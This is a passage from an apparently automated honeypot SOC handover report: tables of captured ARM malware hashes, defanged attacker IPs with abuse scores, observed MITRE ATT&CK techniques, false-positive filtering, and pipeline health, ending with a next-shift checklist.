| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `3.131.220[.]121` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `110.38.234[.]220` | PK | National Wimax/IMS environment | **100** ⚠️ | 3 |
| `114.220.176[.]69` | CN | Chinanet Jiangsu Province Network | **100** ⚠️ | 50 |
| `161.132.51[.]203` | PE | Red Cientifica Peruana | **100** ⚠️ | 35 |
| `120.48.36[.]106` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 23 |
| `36.212.217[.]15` | CN | China Mobile Communications Group Co., Ltd. | **100** ⚠️ | 50 |
| `183.195.131[.]206` | CN | China Mobile Communications Corporation - shanghai company | **100** ⚠️ | 50 |
| `212.115.54[.]84` | TW | Sakura network limited | **100** ⚠️ | 50 |
| `218.78.132[.]164` | CN | CHINANET Shanghai province network | **100** ⚠️ | 50 |
| `101.126.67[.]70` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 62 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 28 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 27 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 13 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 13 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 69 cases |
| Tool 34  | Credential Extractor        | ✅ 57 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 14 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (2.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 12 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 27 priority case(s) shown individually · 12 recon entry/entries in table (4 group(s) consolidating 32 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-16T11:09:01Z_
